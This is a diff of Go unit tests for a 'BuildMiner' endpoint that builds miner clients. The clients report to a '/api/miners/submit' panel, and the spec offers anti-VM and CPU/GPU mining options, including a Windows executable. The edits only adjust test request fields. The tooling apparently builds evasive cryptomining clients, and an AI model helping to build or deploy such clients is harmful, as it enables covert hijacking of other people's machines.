@@ -86,7 +86,7 @@ printf '{"success":true,"output":"%%s/%%s","bytes":6,"sha256":"deadbeef","durati
 
 	h, root := newTestHandler(t, script)
 
-	body := `{"panel_urls":"https://panel.example.com/api/miners/submit","anti_vm":true,"debug_console":true,"file_name":"test-client"}`
+	body := `{"panel_urls":"https://panel.example.com/api/miners/submit","anti_vm":true,"debug_console":true,"file_name":"test-client","embedded_mode":"none"}`
 	rec := httptest.NewRecorder()
 	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
 	h.BuildMiner(rec, req)
@@ -144,7 +144,7 @@ exit 1
 	h, root := newTestHandler(t, script)
 
 	rec := httptest.NewRecorder()
-	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(`{"panel_urls":"https://p.example/api/miners/submit"}`))
+	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(`{"panel_urls":"https://p.example/api/miners/submit","embedded_mode":"none"}`))
 	h.BuildMiner(rec, req)
 
 	if rec.Code != http.StatusInternalServerError {
@@ -359,7 +359,7 @@ printf '{"success":true,"output":"/tmp/x/corvus.exe","bytes":3,"sha256":"abc","d
 	hostGOOS = "windows"
 	defer func() { hostGOOS = old }()
 
-	body := `{"panel_urls":"https://p.example/api/miners/submit","anti_vm":true,"embedded_config":"none","file_name":"win-client"}`
+	body := `{"panel_urls":"https://p.example/api/miners/submit","anti_vm":true,"embedded_mode":"none","file_name":"win-client"}`
 	rec := httptest.NewRecorder()
 	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
 	h.BuildMiner(rec, req)
@@ -391,7 +391,7 @@ printf '{"success":true,"output":"/tmp/x/corvus.exe","bytes":3,"sha256":"abc","d
 		t.Errorf("anti_vm = %v", spec["anti_vm"])
 	}
 	if spec["embedded_config"] != "none" {
-		t.Errorf("embedded_config = %v", spec["embedded_config"])
+		t.Errorf("embedded_config = %v, want none", spec["embedded_config"])
 	}
 	if spec["cpu_miner"] != true || spec["gpu_miner"] != false {
 		t.Errorf("miner flags = cpu:%v gpu:%v", spec["cpu_miner"], spec["gpu_miner"])
@@ -419,7 +419,7 @@ func TestBuildMinerRealBuilder(t *testing.T) {
 	h := NewHandler(nil, filepath.Join(repoRoot, "Panel"))
 
 	rec := httptest.NewRecorder()
-	body := `{"panel_urls":"https://panel.example.com/api/miners/submit","cpu_miner":true}`
+	body := `{"panel_urls":"https://panel.example.com/api/miners/submit","cpu_miner":true,"embedded_mode":"none"}`
 	req := httptest.NewRequest(http.MethodPost, "/api/build", strings.NewReader(body))
 	h.BuildMiner(rec, req)
 
